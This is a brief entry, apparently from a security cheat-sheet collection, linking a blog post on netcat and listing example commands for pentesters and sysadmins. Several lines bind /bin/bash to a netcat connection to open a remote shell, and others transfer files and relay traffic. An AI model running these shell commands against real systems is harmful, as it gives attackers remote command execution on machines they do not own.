[Netcat - All you need to know](https://blog.ikuamike.io/posts/2021/netcat/)

*Description*: In this article we’ll look at different applications of netcat and how it can be useful in day to day activities of a pentester, security professional, sysadmin etc…

*Labels*: #Netcat #Pentest

*Examples*:

```bash
$ nc -lvnp 8080                                    # start listening for connection
$ nc -lvnp 8080 -e /bin/bash                       # reverse shell on server
$ nc 127.0.0.1 8080                                # connect to server
$ nc 127.0.0.1 8080 -e /bin/bash                   # reverse shell on client
$ nc -lvnp 8080 < infile                           # transfer file
$ nc 127.0.0.1 8080 > outfile                      # receive file
$ nc -klvnp 8000 -e "/bin/nc 192.168.125.40 8080"  # redirect traffic
```
